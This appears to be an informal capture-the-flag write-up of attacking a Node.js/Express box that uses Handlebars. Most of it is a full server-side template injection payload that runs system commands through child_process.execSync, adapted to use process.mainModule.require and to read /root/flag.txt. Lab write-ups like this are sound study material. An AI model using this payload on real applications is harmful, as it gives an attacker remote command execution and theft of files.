this box shows an ssh and http service

on the side we identify exppress
with other words node js
this uses handlebars
here we find an exploit to test on the site
`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs`

on the url it says: trying a payload `{{7*7}}`
as we can see in burp the payloads is encoded to url we'l have to encode ours ass well

{{#with "s" as |string|}}
 {{#with "e"}}
 {{#with split as |conslist|}}
 {{this.pop}}
 {{this.push (lookup string.sub "constructor")}}
 {{this.pop}}
 {{#with string.split as |codelist|}}
 {{this.pop}}
 {{this.push "return require('child_process').execSync('whoami');"}}
 {{this.pop}}
 {{#each conslist}}
 {{#with (string.sub.apply 0 codelist)}}
 {{this}}
 {{/with}}
 {{/each}}
 {{/with}}
 {{/with}}
 {{/with}}
{{/with}}

trying the first it lets us now that require doesnt exist
thus we'l need to changge it a bit:
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}

with this it gets us the flag:
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
